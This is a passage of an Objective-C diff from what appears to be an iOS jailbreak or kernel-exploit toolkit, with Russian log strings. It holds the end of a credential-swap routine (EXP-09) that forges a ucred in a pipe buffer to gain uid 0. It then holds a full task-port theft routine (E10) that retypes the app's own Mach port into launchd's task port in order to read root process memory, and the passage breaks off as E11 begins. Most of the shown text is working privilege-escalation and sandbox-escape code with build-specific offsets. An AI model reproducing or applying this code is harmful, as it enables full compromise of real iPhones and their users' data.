+        [r appendString:@"FAIL: pipe struct не найден по fd-таблице\n"];
+        return r;
+    }
+
+    uint64_t bufferVA = 0;
+    uint8_t pipeWin[0x100];
+    memset(pipeWin, 0, sizeof(pipeWin));
+    kpRead(pipeVA, pipeWin, sizeof(pipeWin), "pipe struct", r);
+    for (int off = 0; off + 8 <= (int)sizeof(pipeWin) && !bufferVA; off += 8) {
+        uint64_t q = 0;
+        memcpy(&q, pipeWin + off, 8);
+        uint64_t cand = kp_untag_ptr(q);
+        if (!kpLooksLikeKernelPointer(cand)) continue;
+        uint8_t probe[16];
+        memset(probe, 0, sizeof(probe));
+        if (!kpRead(cand, probe, sizeof(probe), "pipe buf candidate", r)) continue;
+        if (memcmp(probe, kForgeMagic, 16) == 0) {
+            bufferVA = cand;
+        }
+    }
+    if (!bufferVA) {
+        [r appendString:@"FAIL: буфер pipe не найден по магии KPRCRED1\n"];
+        return r;
+    }
+    uint64_t forgedUcredVA = bufferVA + 16;
+    kpNote(r, [NSString stringWithFormat:@"  буфер pipe=0x%016llx → forged ucred=0x%016llx",
+              (unsigned long long)bufferVA, (unsigned long long)forgedUcredVA]);
+
+    // 5. Writability pre-filter (spec §0): the pages we touch must be heap
+    //    type. proc_ro is written by fork, so it must be XNU_DEFAULT.
+    if (gFrameTableVA) {
+        int tRo = -1, tBuf = -1;
+        uint64_t pa = kvtophys(procRo);
+        if (pa) tRo = kpFrameTypeOfPALogged(gFrameTableVA, pa, r);
+        pa = kvtophys(bufferVA);
+        if (pa) tBuf = kpFrameTypeOfPALogged(gFrameTableVA, pa, r);
+        kpNote(r, [NSString stringWithFormat:@"  типы фреймов: proc_ro=%@ forge=%@ (heap=0x%02x)",
+                  tRo < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tRo],
+                  tBuf < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tBuf],
+                  gHeapFrameType]);
+        if (gHeapTypeKnown && ((tRo >= 0 && tRo != gHeapFrameType) || (tBuf >= 0 && tBuf != gHeapFrameType))) {
+            [r appendString:@"FAIL: proc_ro или буфер НЕ heap-типа (RO-зона) — запись отменена до паники\n"];
+            return r;
+        }
+    }
+    else {
+        [r appendString:@"  оракул типов недоступен — продолжаю без предфильтра (proc_ro пишется форком → обычная зона)\n"];
+    }
+
+    // 6. The swap: one 8-byte heap write. Original pointer saved for manual
+    //    restore; never auto-restored (forged object must stay alive).
+    static uint64_t sOrigUcred = 0;
+    sOrigUcred = curUcred;
+    kpNote(r, [NSString stringWithFormat:@"  оригинальный p_ucred = 0x%016llx (сохранён в лог; не восстанавливается)",
+              (unsigned long long)sOrigUcred]);
+
+    kwritebuf(ucredSlot, &forgedUcredVA, sizeof(forgedUcredVA));
+    uint64_t rbRaw = 0;
+    kpRead(ucredSlot, &rbRaw, sizeof(rbRaw), "p_ucred readback", r);
+    uint64_t rb = kp_untag_ptr(rbRaw);
+    kpNote(r, [NSString stringWithFormat:@"  readback после подмены: 0x%016llx (ждём 0x%016llx)",
+              (unsigned long long)rb, (unsigned long long)forgedUcredVA]);
+    if (rb != forgedUcredVA) {
+        [r appendString:@"FAIL: подмена не прилипла — kwrite по proc_ro не работает\n"];
+        return r;
+    }
+
+    // 7. Verify.
+    uid_t newUid = getuid();
+    gid_t newGid = getgid();
+    kpNote(r, [NSString stringWithFormat:@"  после подмены: getuid()=%d getgid()=%d", newUid, newGid]);
+
+    const char *probePath = "/private/var/root/kexproof-e9-probe.txt";
+    errno = 0;
+    FILE *f = fopen(probePath, "w");
+    if (f) {
+        fputs("kexproof e9\n", f);
+        fclose(f);
+        unlink(probePath);
+        [r appendString:@"  /private/var/root: запись УДАЛАСЬ — sandbox не держит (label очищен)\n"];
+    }
+    else {
+        kpNote(r, [NSString stringWithFormat:@"  /private/var/root: %s — uid уже root, но sandbox ещё действует (MAC label кеширован?)", strerror(errno)]);
+    }
+
+    if (newUid == 0) {
+        [r appendString:@"\n=== EXP-09 PASS: uid 0 через heap-only pointer-swap. Записей в защищённую память не было. ===\n"];
+        [r appendString:@"Форг живёт в pipe-буфере (fd'шки намеренно утёкшие). До перезагрузки мы root.\n"];
+    }
+    else {
+        [r appendString:@"\n=== EXP-09 FAIL: указатель подменён, но getuid() не 0 — credential кешируется где-то ещё ===\n"];
+    }
+    return r;
+}
+
+#pragma mark - E10: task-port theft (sandbox escape via data-only heap write)
+
+// io_bits layout is build-dependent. Field data (iPhone 15 Pro, 18.6): a
+// legit task port has io_bits=0x80000002 — kotype IKOT_TASK(2) in the LOW
+// bits, active in bit 31, NOT the classic 0x0FFF0000 window. So E10 never
+// parses or synthesizes io_bits: the victim port gets the VERBATIM io_bits of
+// our own real task port — a valid task-port template on this build by
+// definition. (Macro kept for an informational low-12 decode in logs only.)
+#define KP_IO_BITS_KOTYPE_LOW 0x00000FFFu
+#define KP_IKOT_TASK          2u
+
+// kutils.m implements the engine-side itk_space walk but its header only
+// exports task_get_ipc_port_kobject. Declared here as an independent
+// cross-check of the manually logged walk below.
+extern uint64_t task_get_ipc_port_object(uint64_t task, mach_port_t port);
+
+// Verbatim port of the exploit engine's kread_smrptr (krw.m:139), applied to
+// the RAW qword. is_table is SMR-encoded, NOT PAC-tagged: a kp_untag_ptr
+// before the decode destroys the SMR tag bits (field data, this boot:
+// raw 0x27cdbfe834a9c02a → formula → 0x27cdffe834a9c000 → caller applies the
+// 47-bit sign extension → canonical 0xffffffe834a9c000). Constants come from
+// the offsets.m ladder (smr_base=2, t1sz_boot=0x11 on A17 Pro / iOS 18.x).
+static uint64_t kpSMRDecode(uint64_t value)
+{
+    uint64_t bits = (smr_base << (62 - t1sz_boot));
+    if ((value & bits) == 0) {
+        return ((value & (0xFFFFFFFFFFFFC000ULL & ~bits)) | bits);
+    }
+    return (value & 0xFFFFFFFFFFFFFFE0ULL);
+}
+
++ (NSString *)taskPortTheftReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== E10: task-port theft → launchd (data-only heap write) ===\n"];
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
+        return r;
+    }
+
+    // All locals up front: the failure path is a single goto label that
+    // destroys the port, so no ARC-scoped object declarations past this point.
+    mach_port_t stolen = MACH_PORT_NULL;
+    kern_return_t kr = KERN_SUCCESS, krBefore = KERN_SUCCESS, krAfter = KERN_SUCCESS;
+    kern_return_t krReg = KERN_SUCCESS, krRd = KERN_SUCCESS;
+    pid_t probePid = -1, gotPid = -1;
+    uint64_t selfTask = 0, selfProc = 0;
+    uint64_t spaceRaw = 0, itkSpace = 0, tableRaw = 0, table = 0;
+    uint64_t entryVA = 0, objRaw = 0, ourPortVA = 0, xcheck = 0;
+    uint64_t launchdProc = 0, launchdProcRo = 0, launchdTask = 0;
+    uint64_t roRaw = 0, tRaw = 0, mapRaw = 0, selfTaskPortObj = 0;
+    uint64_t tRaw2 = 0, lspaceRaw = 0, launchdMap = 0, launchdSpace = 0;
+    uint64_t ioSlot = 0, kobjSlot = 0, origKobjRaw = 0, rb64 = 0;
+    uint32_t origIoBits = 0, newIoBits = 0, rb32 = 0;
+    uint32_t realIoBits = 0, kobjOff = 0;
+    int foundOff = -1;
+    BOOL didSteal = NO, restored = NO, pidOK = NO, regionOK = NO, readOK = NO;
+    char commBuf[33];
+    uint8_t portHdr[0x60], realHdr[0x60];
+    mach_vm_address_t raddr = 0;
+    mach_vm_size_t rsize = 0, want = 0;
+    vm_region_basic_info_data_64_t regInfo;
+    mach_msg_type_number_t icnt = VM_REGION_BASIC_INFO_COUNT_64, dataCnt = 0;
+    mach_port_t objName = MACH_PORT_NULL;
+    vm_offset_t dataOut = 0;
+
+    kpNote(r, [NSString stringWithFormat:@"  лестница: task.itk_space=+0x%x · ipc_space.is_table=+0x%x · sizeof(ipc_entry)=0x%x · ipc_entry.ie_object=+0x%x · ipc_port.ip_kobject=+0x%x · proc.proc_ro=+0x%x · proc.pid=+0x%x · proc.p_name=+0x%x · proc_ro.pr_task=+0x%x",
+              off_task_itk_space, off_ipc_space_is_table, sizeof_ipc_entry,
+              off_ipc_entry_ie_object, off_ipc_port_ip_kobject,
+              off_proc_p_proc_ro, off_proc_p_pid, off_proc_p_name, off_proc_ro_pr_task]);
+
+    // 1. Sacrificial port: receive right, then a send right on the same name —
+    //    task-port MIG calls (pid_for_task, mach_vm_*) resolve the name via a
+    //    SEND right entry.
+    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &stolen);
+    if (kr != KERN_SUCCESS) {
+        [r appendFormat:@"FAIL: mach_port_allocate: %s\n", mach_error_string(kr)];
+        return r;
+    }
+    kr = mach_port_insert_right(mach_task_self(), stolen, stolen, MACH_MSG_TYPE_MAKE_SEND);
+    if (kr != KERN_SUCCESS) {
+        mach_port_destroy(mach_task_self(), stolen);
+        [r appendFormat:@"FAIL: mach_port_insert_right: %s\n", mach_error_string(kr)];
+        return r;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  наш порт: name=0x%x (recv+send), table index=0x%x",
+              (unsigned)stolen, (unsigned)(stolen >> 8)]);
+
+    // Control BEFORE: a vanilla port is not a task port.
+    krBefore = pid_for_task(stolen, &probePid);
+    kpNote(r, [NSString stringWithFormat:@"  контроль ДО подмены: pid_for_task → %s (pid=%d) — ждём отказ",
+              mach_error_string(krBefore), (int)probePid]);
+
+    // 2. Our task VA (engine-cached after the win; fallback — proc chain).
+    selfTask = task_self();
+    kpNote(r, [NSString stringWithFormat:@"  наш task (task_self): 0x%016llx", (unsigned long long)selfTask]);
+    if (!kpLooksLikeKernelPointer(selfTask)) {
+        selfProc = proc_self();
+        if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)getpid() log:r];
+        if (selfProc &&
+            kpRead(selfProc + off_proc_p_proc_ro, &roRaw, sizeof(roRaw), "proc.proc_ro", r) &&
+            kpRead(kp_untag_ptr(roRaw) + off_proc_ro_pr_task, &tRaw, sizeof(tRaw), "proc_ro.pr_task", r)) {
+            selfTask = kp_untag_ptr(tRaw);
+            kpNote(r, [NSString stringWithFormat:@"  наш task (proc-цепь): 0x%016llx", (unsigned long long)selfTask]);
+        }
+    }
+    if (!kpLooksLikeKernelPointer(selfTask)) {
+        [r appendString:@"FAIL: свой task не найден\n"];
+        goto e10fail;
+    }
+
+    // 3. itk_space walk to our port's ipc_port VA:
+    //    task → itk_space → is_table (SMR на 16.1+) → entry[name>>8] → ie_object.
+    if (!kpRead(selfTask + off_task_itk_space, &spaceRaw, sizeof(spaceRaw), "task.itk_space", r)) goto e10fail;
+    itkSpace = kp_untag_ptr(spaceRaw);
+    kpNote(r, [NSString stringWithFormat:@"  itk_space: raw=0x%016llx → 0x%016llx",
+              (unsigned long long)spaceRaw, (unsigned long long)itkSpace]);
+    if (!kpLooksLikeKernelPointer(itkSpace)) {
+        [r appendString:@"FAIL: itk_space не kernel-указатель\n"];
+        goto e10fail;
+    }
+
+    if (!kpRead(itkSpace + off_ipc_space_is_table, &tableRaw, sizeof(tableRaw), "ipc_space.is_table", r)) goto e10fail;
+    if (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot) {
+        // SMR-поле читается СЫРЫМ и декодируется без предварительного untag —
+        // kp_untag_ptr до формулы сносит теговые биты и ломает декод (проверено
+        // на железе). Формула отдаёт 47-битное значение с тегом в старших
+        // битах; kp_untag_ptr ПОСЛЕ декода канонизирует его в kernel VA.
+        uint64_t bits = (smr_base << (62 - t1sz_boot));
+        uint64_t dec = kpSMRDecode(tableRaw);
+        table = kp_untag_ptr(dec);
+        kpNote(r, [NSString stringWithFormat:@"  is_table (SMR): raw=0x%016llx · bits=0x%016llx (smr_base=%llu t1sz=%llu) → decode=0x%016llx → canon=0x%016llx",
+                  (unsigned long long)tableRaw, (unsigned long long)bits,
+                  (unsigned long long)smr_base, (unsigned long long)t1sz_boot,
+                  (unsigned long long)dec, (unsigned long long)table]);
+    }
+    else {
+        table = kp_untag_ptr(tableRaw);
+        kpNote(r, [NSString stringWithFormat:@"  is_table (не SMR): raw=0x%016llx → 0x%016llx (uses_smr=%d smr_base=%llu t1sz=%llu)",
+                  (unsigned long long)tableRaw, (unsigned long long)table,
+                  (int)koffsetof(ipc_space, table_uses_smr),
+                  (unsigned long long)smr_base, (unsigned long long)t1sz_boot]);
+    }
+    if (!kpLooksLikeKernelPointer(table)) {
+        [r appendString:@"FAIL: is_table не kernel-указатель\n"];
+        goto e10fail;
+    }
+
+    entryVA = table + (uint64_t)sizeof_ipc_entry * (stolen >> 8);
+    kpNote(r, [NSString stringWithFormat:@"  entry[0x%x] @ 0x%016llx (table 0x%016llx + 0x%x*index)",
+              (unsigned)(stolen >> 8), (unsigned long long)entryVA, (unsigned long long)table, sizeof_ipc_entry]);
+    if (!kpRead(entryVA + off_ipc_entry_ie_object, &objRaw, sizeof(objRaw), "ipc_entry.ie_object", r)) goto e10fail;
+    ourPortVA = kp_untag_ptr(objRaw);
+    kpNote(r, [NSString stringWithFormat:@"  ie_object: raw=0x%016llx → наш ipc_port VA = 0x%016llx",
+              (unsigned long long)objRaw, (unsigned long long)ourPortVA]);
+    if (!kpLooksLikeKernelPointer(ourPortVA)) {
+        [r appendString:@"FAIL: ie_object не kernel-указатель\n"];
+        goto e10fail;
+    }
+
+    // Independent cross-check through the engine's own walk (kutils.m).
+    xcheck = task_get_ipc_port_object(selfTask, stolen);
+    kpNote(r, [NSString stringWithFormat:@"  cross-check task_get_ipc_port_object: 0x%016llx — %@",
+              (unsigned long long)xcheck,
+              xcheck == ourPortVA ? @"СОВПАЛО" : @"РАСХОДИТСЯ — работаю по ручному walk'у, осторожно"]);
+
+    // 4. launchd: pid 1 — ТОЛЬКО fast pid-walk. findProcByPid / proc_find /
+    //    zone-маршрут намеренно отключены: zone-маршрут — это тысячи gated
+    //    чтений и zone-guard паника (ребут на железе), полный gated walk —
+    //    та же цена. Не нашёл — честный FAIL, ядро цело.
+    launchdProc = [self findSelfProcByPidFast:1 log:r];
+    if (!launchdProc) {
+        [r appendString:@"FAIL: launchd (pid 1) не найден fast walk'ом — счётчик узлов в логе выше. Опасные fallback'и (findProcByPid / proc_find / zone-маршрут) отключены намеренно.\n"];
+        goto e10fail;
+    }
+
+    memset(commBuf, 0, sizeof(commBuf));
+    if (kpRead(launchdProc + off_proc_p_name, commBuf, 32, "launchd comm", r)) {
+        kpNote(r, [NSString stringWithFormat:@"  comm pid 1: \"%s\" (ждём launchd)", commBuf]);
+        if (strncmp(commBuf, "launchd", 7) != 0) {
+            kpNote(r, @"  ВНИМАНИЕ: comm не launchd — pid-оффсет под вопросом, продолжаю (решает readback)");
+        }
+    }
+
+    if (!kpRead(launchdProc + off_proc_p_proc_ro, &roRaw, sizeof(roRaw), "launchd proc.proc_ro", r)) goto e10fail;
+    launchdProcRo = kp_untag_ptr(roRaw);
+    kpNote(r, [NSString stringWithFormat:@"  launchd proc_ro: raw=0x%016llx → 0x%016llx",
+              (unsigned long long)roRaw, (unsigned long long)launchdProcRo]);
+    if (!kpLooksLikeKernelPointer(launchdProcRo)) {
+        [r appendString:@"FAIL: launchd proc_ro не kernel-указатель\n"];
+        goto e10fail;
+    }
+    // Отсюда и до конца КАЖДОЕ чтение идёт по вычисленному адресу — требуем,
+    // чтобы unmapped-гейт kpRead был вооружён. Иначе kpRead деградирует до
+    // голого kreadbuf по любому мусорному базису — именно так умер ребут #3
+    // (data abort, far=0x0000a62f00000018: двойной dereference мусорного
+    // launchdTask ядром при MIG-верификации). Лучше честный FAIL, чем паника.
+    if (!gCpuTtepVA && !gCpuTtepPhys) {
+        [r appendString:@"FAIL: translation-гейт не поднят (gCpuTtepVA/gCpuTtepPhys == 0) — чтения по launchd-цепочке пошли бы безгейтово, стоп до паники\n"];
+        goto e10fail;
+    }
+
+    // pr_task: двойное чтение с голосованием. Одиночный прогон может вернуть
+    // мусор, который ПРОЙДЁТ kernel-pointer check (0xffffff...-образный) и
+    // убьёт ядро позже — в pid_for_task/mach_vm_* на подменённом порту.
+    if (!kpRead(launchdProcRo + off_proc_ro_pr_task, &tRaw, sizeof(tRaw), "launchd proc_ro.pr_task", r)) goto e10fail;
+    if (!kpRead(launchdProcRo + off_proc_ro_pr_task, &tRaw2, sizeof(tRaw2), "launchd proc_ro.pr_task (повтор)", r)) goto e10fail;
+    launchdTask = kp_untag_ptr(tRaw);
+    kpNote(r, [NSString stringWithFormat:@"  launchd task_t: raw=0x%016llx повтор=0x%016llx → 0x%016llx%@",
+              (unsigned long long)tRaw, (unsigned long long)tRaw2, (unsigned long long)launchdTask,
+              tRaw == tRaw2 ? @"" : @" — НЕСТАБИЛЬНО!"]);
+    if (tRaw != tRaw2) {
+        [r appendString:@"FAIL: pr_task нестабилен между двумя чтениями — каналу нет доверия, стоп\n"];
+        goto e10fail;
+    }
+    if (!kpLooksLikeKernelPointer(launchdTask) || (launchdTask & 0xF)) {
+        [r appendFormat:@"FAIL: launchd task_t не похож на zone-объект (0x%016llx, выравнивание %s) — стоп до паники\n",
+            (unsigned long long)launchdTask, (launchdTask & 0xF) ? "кривое" : "ок"];
+        goto e10fail;
+    }
+    if (launchdTask == selfTask) {
+        [r appendString:@"FAIL: launchd task_t == наш собственный task — цепочка замкнулась на себя, стоп\n"];
+        goto e10fail;
+    }
+
+    // Sanity-дерефы настоящего task: map и itk_space у реального task_t —
+    // валидные kernel-указатели. Оба чтения gated (kpRead), оба результата
+    // ФАТАЛЬНЫ при несовпадении — это последний рубеж перед тем, как отдать
+    // launchdTask ядру через подменённый порт.
+    if (!kpRead(launchdTask + off_task_map, &mapRaw, sizeof(mapRaw), "launchd task.map", r)) goto e10fail;
+    launchdMap = kp_untag_ptr(mapRaw);
+    kpNote(r, [NSString stringWithFormat:@"  sanity: launchd task.map raw=0x%016llx → 0x%016llx",
+              (unsigned long long)mapRaw, (unsigned long long)launchdMap]);
+    if (!kpLooksLikeKernelPointer(launchdMap)) {
+        [r appendFormat:@"FAIL: launchd task.map не kernel-указатель (0x%016llx) — launchdTask невалиден, стоп до паники\n",
+            (unsigned long long)launchdMap];
+        goto e10fail;
+    }
+    if (!kpRead(launchdTask + off_task_itk_space, &lspaceRaw, sizeof(lspaceRaw), "launchd task.itk_space", r)) goto e10fail;
+    launchdSpace = kp_untag_ptr(lspaceRaw);
+    kpNote(r, [NSString stringWithFormat:@"  sanity: launchd task.itk_space raw=0x%016llx → 0x%016llx",
+              (unsigned long long)lspaceRaw, (unsigned long long)launchdSpace]);
+    if (!kpLooksLikeKernelPointer(launchdSpace)) {
+        [r appendFormat:@"FAIL: launchd task.itk_space не kernel-указатель (0x%016llx) — launchdTask невалиден, стоп до паники\n",
+            (unsigned long long)launchdSpace];
+        goto e10fail;
+    }
+    kpNote(r, [NSString stringWithFormat:@"  launchd task_t 0x%016llx прошёл все проверки (map + itk_space валидны)",
+              (unsigned long long)launchdTask]);
+
+    // 5. Oracle на нашем НАСТОЯЩЕМ task-port — теперь фатальный. Ребут #4
+    //    показал: подмена по слепой лестнице оффсетов может дать порт, который
+    //    ядро не признаёт (pid_for_task → KERN_FAILURE) или признаёт криво
+    //    (mach_vm_* по мусору). Поэтому до подмены читаем легальный task port
+    //    целиком: (a) калибруем, в КАКОМ qword заголовка реально лежит
+    //    selfTask — если не в +0x48, оффсет для этого билда другой, и мы либо
+    //    находим его сканом, либо стоп; (b) снимаем io_bits-шаблон легального
+    //    task port (kotype + любые новые флаги билда в старших 16 битах).
+    selfTaskPortObj = task_get_ipc_port_object(selfTask, mach_task_self());
+    if (!kpLooksLikeKernelPointer(selfTaskPortObj)) {
+        [r appendString:@"FAIL: не нашли VA собственного task port — стоп до подмены\n"];
+        goto e10fail;
+    }
+    memset(realHdr, 0, sizeof(realHdr));
+    if (!kpRead(selfTaskPortObj, realHdr, sizeof(realHdr), "self task-port hdr", r)) goto e10fail;
+    memcpy(&realIoBits, realHdr, sizeof(realIoBits));
+    // Никакого парсинга и никакой фатальной проверки kotype: значение io_bits
+    // настоящего task port — это и есть шаблон, пишется дословно. (Полевые
+    // данные 18.6/A17 Pro: 0x80000002 — kotype IKOT_TASK в младших битах.)
+    kpNote(r, [NSString stringWithFormat:@"  настоящий task-port @ 0x%016llx: io_bits=0x%08x (low12=%u active=%u) — шаблон, пишется дословно",
+                  (unsigned long long)selfTaskPortObj, realIoBits,
+                  realIoBits & KP_IO_BITS_KOTYPE_LOW, (realIoBits >> 31) & 1]);
+
+    kobjOff = off_ipc_port_ip_kobject;
+    {
+        uint64_t cand = 0;
+        memcpy(&cand, realHdr + kobjOff, sizeof(cand));
+        if (kp_untag_ptr(cand) == selfTask) {
+            kpNote(r, [NSString stringWithFormat:@"  oracle: ip_kobject @ +0x%x == selfTask — оффсет верен", kobjOff]);
+        }
+        else {
+            kpNote(r, [NSString stringWithFormat:@"  oracle: @ +0x%x лежит 0x%016llx, а не selfTask — сканирую заголовок порта…",
+                      kobjOff, (unsigned long long)kp_untag_ptr(cand)]);
+            for (uint32_t off = 0x8; off + 8 <= sizeof(realHdr); off += 8) {
+                uint64_t q = 0;
+                memcpy(&q, realHdr + off, sizeof(q));
+                if (kp_untag_ptr(q) == selfTask) { foundOff = (int)off; break; }
+            }
+            if (foundOff < 0) {
+                [r appendString:@"FAIL: в первых 0x60 байтах настоящего task port нет selfTask — структура ipc_port другая, стоп до паники\n"];
+                goto e10fail;
+            }
+            kobjOff = (uint32_t)foundOff;
+            kpNote(r, [NSString stringWithFormat:@"  oracle: ip_kobject скорректирован: +0x%x → +0x%x (selfTask лежит там)",
+                      off_ipc_port_ip_kobject, kobjOff]);
+        }
+    }
+
+    // 6. Baseline of OUR port, then the theft. Write order: kobject first,
+    //    kotype flip second — нет момента, когда task-kotype порт держит
+    //    NULL/garbage kobject.
+    ioSlot   = ourPortVA; // ipc_object.io_bits @ +0
+    kobjSlot = ourPortVA + kobjOff; // оффсет откалиброван оракулом выше
+    if (!kpRead(ioSlot, &origIoBits, sizeof(origIoBits), "ourPort io_bits", r)) goto e10fail;
+    if (!kpRead(kobjSlot, &origKobjRaw, sizeof(origKobjRaw), "ourPort ip_kobject", r)) goto e10fail;
+    kpNote(r, [NSString stringWithFormat:@"  наш ipc_port @ 0x%016llx: io_bits=0x%08x (low12=%u active=%u), ip_kobject raw=0x%016llx",
+              (unsigned long long)ourPortVA, origIoBits,
+              origIoBits & KP_IO_BITS_KOTYPE_LOW, (origIoBits >> 31) & 1,
+              (unsigned long long)origKobjRaw]);
+    kpNote(r, [NSString stringWithFormat:@"  сохранено для restore: io_bits=0x%08x · ip_kobject=0x%016llx",
+              origIoBits, (unsigned long long)origKobjRaw]);
+
+    // io_bits жертвы = ДОСЛОВНО io_bits настоящего task port (все 32 бита).
+    // Никакой сборки из констант: шаблон валиден на этом билде по определению.
+    newIoBits = realIoBits;
+    kpNote(r, [NSString stringWithFormat:@"  io_bits: наш=0x%08x · шаблон task port=0x%08x → пишем дословно 0x%08x",
+              origIoBits, realIoBits, newIoBits]);
+    kpNote(r, [NSString stringWithFormat:@"  кража: ПИШЕМ ТОЛЬКО В НАШ ПОРТ — io_bits @ 0x%016llx ← 0x%08x (дословная копия io_bits настоящего task port) · ip_kobject @ 0x%016llx ← 0x%016llx (launchd task_t; сам launchd task не пишется)",
+              (unsigned long long)ioSlot, newIoBits,
+              (unsigned long long)kobjSlot, (unsigned long long)launchdTask]);
+    kwritebuf(kobjSlot, &launchdTask, sizeof(launchdTask));
+    kwritebuf(ioSlot, &newIoBits, sizeof(newIoBits));
+
+    kpRead(kobjSlot, &rb64, sizeof(rb64), "ip_kobject readback", r);
+    kpRead(ioSlot, &rb32, sizeof(rb32), "io_bits readback", r);
+    kpNote(r, [NSString stringWithFormat:@"  readback: ip_kobject=0x%016llx (ждём 0x%016llx) · io_bits=0x%08x (ждём 0x%08x)",
+              (unsigned long long)rb64, (unsigned long long)launchdTask, rb32, newIoBits]);
+    if (kp_untag_ptr(rb64) != launchdTask || rb32 != newIoBits) {
+        [r appendString:@"FAIL: подмена не прилипла — kwrite по ipc ports zone не работает? Откатываю.\n"];
+        kwritebuf(ioSlot, &origIoBits, sizeof(origIoBits));
+        kwritebuf(kobjSlot, &origKobjRaw, sizeof(origKobjRaw));
+        goto e10fail;
+    }
+    didSteal = YES;
+
+    // 7. Userspace verification THROUGH the stolen port: pid_for_task must
+    //    answer 1, mach_vm_region must enumerate launchd's map, mach_vm_read
+    //    must return launchd's bytes. Всё это до кражи падало (см. контроль).
+    krAfter = pid_for_task(stolen, &gotPid);
+    kpNote(r, [NSString stringWithFormat:@"  pid_for_task ПОСЛЕ: %s, pid=%d (ждём KERN_SUCCESS и 1)",
+              mach_error_string(krAfter), (int)gotPid]);
+    pidOK = (krAfter == KERN_SUCCESS && gotPid == 1);
+
+    if (!pidOK) {
+        // Порт НЕ признан task port → mach_vm_region/read на нём — это и был
+        // kernel data abort (ребуты #3/#4, far=мусор+0x18). НЕ ходим.
+        // Вместо этого диффим первые 0x60 байт подменённого порта против
+        // настоящего task port — лог покажет, какого поля не хватает ядру.
+        [r appendString:@"  порт НЕ признан task port — mach_vm_region/read ПРОПУЩЕНЫ (там паника). Дифф портов:\n"];
+        memset(portHdr, 0, sizeof(portHdr));
+        if (kpRead(ourPortVA, portHdr, sizeof(portHdr), "stolen port hdr", r)) {
+            kpNote(r, @"  наш порт (подменённый), первые 0x60:");
+            kpAppendHexDump(r, ourPortVA, portHdr, sizeof(portHdr));
+        }
+        kpNote(r, @"  настоящий task port (шаблон), первые 0x60:");
+        kpAppendHexDump(r, selfTaskPortObj, realHdr, sizeof(realHdr));
+    }
+    else {
+        memset(&regInfo, 0, sizeof(regInfo));
+        krReg = mach_vm_region(stolen, &raddr, &rsize, VM_REGION_BASIC_INFO_64,
+                               (vm_region_info_t)&regInfo, &icnt, &objName);
+        kpNote(r, [NSString stringWithFormat:@"  mach_vm_region(launchd): %s → base=0x%016llx size=0x%llx",
+                  mach_error_string(krReg), (uint64_t)raddr, (uint64_t)rsize]);
+        regionOK = (krReg == KERN_SUCCESS);
+
+        if (regionOK && rsize) {
+            want = rsize < 0x100 ? rsize : 0x100;
+            krRd = mach_vm_read(stolen, raddr, want, &dataOut, &dataCnt);
+            if (krRd == KERN_SUCCESS && dataCnt) {
+                readOK = YES;
+                kpNote(r, [NSString stringWithFormat:@"  mach_vm_read: %u байт из launchd @ 0x%016llx — чужая память читается:",
+                          dataCnt, (uint64_t)raddr]);
+                kpAppendHexDump(r, raddr, (const void *)dataOut, dataCnt > 0x40 ? 0x40 : dataCnt);
+                mach_vm_deallocate(mach_task_self(), dataOut, dataCnt);
+            }
+            else {
+                kpNote(r, [NSString stringWithFormat:@"  mach_vm_read: %s", mach_error_string(krRd)]);
+            }
+        }
+    }
+
+    // 8. Restore BEFORE teardown, in reverse order. A task-kotype port with a
+    //    foreign kobject reaching ipc_port_dealloc drops a task reference
+    //    nobody took — launchd task refcount underflow → паника на выходе.
+    if (didSteal) {
+        kwritebuf(ioSlot, &origIoBits, sizeof(origIoBits));
+        kwritebuf(kobjSlot, &origKobjRaw, sizeof(origKobjRaw));
+        kpRead(ioSlot, &rb32, sizeof(rb32), "io_bits restore readback", r);
+        kpRead(kobjSlot, &rb64, sizeof(rb64), "ip_kobject restore readback", r);
+        restored = (rb32 == origIoBits) && (rb64 == origKobjRaw);
+        kpNote(r, [NSString stringWithFormat:@"  restore: io_bits=0x%08x (ждём 0x%08x) · ip_kobject=0x%016llx (ждём 0x%016llx) — %@",
+                  rb32, origIoBits, (unsigned long long)rb64, (unsigned long long)origKobjRaw,
+                  restored ? @"OK" : @"НЕ СОШЛОСЬ"]);
+    }
+    if (restored || !didSteal) {
+        mach_port_destroy(mach_task_self(), stolen);
+        kpNote(r, @"  порт уничтожен (mach_port_destroy после restore)");
+    }
+    else {
+        // Destroying now would panic at dealloc; leaving it panics at process
+        // exit. Either way — say it loudly and keep the session alive.
+        [r appendString:@"КРИТИЧНО: restore не подтверждён — порт оставлен подменённым, НЕ уничтожай приложение до ребута!\n"];
+    }
+
+    if (pidOK && regionOK && readOK) {
+        [r appendString:@"\n=== E10 PASS: ESCAPE — наш порт отвечает как task port launchd (pid 1, unsandboxed root) ===\n"];
+        [r appendString:@"Записано было только в наш собственный ipc_port (RW heap); launchd task не писался, подмена восстановлена. Постоянный вариант = полный контроль launchd: mach_vm_write в root-процесс, task_threads → нити, без единой записи в KPP/KTRR/RO-память.\n"];
+    }
+    else if (didSteal) {
+        if (!pidOK) {
+            [r appendFormat:@"\n=== E10 FAIL: порт не признан task port (pid_for_task: %s, pid=%d) — vm_* пропущены, подмена откачена, паники не было. Дифф портов выше ===\n",
+                mach_error_string(krAfter), (int)gotPid];
+        }
+        else {
+            [r appendFormat:@"\n=== E10 FAIL: подмена прилипла, но верификация не полная (pid_for_task: %s pid=%d · vm_region: %s · vm_read: %s) ===\n",
+                mach_error_string(krAfter), (int)gotPid,
+                regionOK ? "ok" : mach_error_string(krReg),
+                readOK ? "ok" : (regionOK ? mach_error_string(krRd) : "n/a (region не открылся)")];
+        }
+    }
+    else {
+        [r appendString:@"\n=== E10 FAIL: см. лог выше ===\n"];
+    }
+    return r;
+
+e10fail:
+    if (stolen != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), stolen);
+    return r;
+}
+
+#pragma mark - E11: proc_ro-swap → root + unsandbox (heap pointer swap)
+
+// E11 replaces the dead EXP-09 ucred-swap (proc_ro is RO-zone on 18.6 — the
+// 1.9.2 in-place patch proved field writes never land) and the E10 port
+// retype. Instead of patching fields INSIDE proc_ro, swap the proc_ro
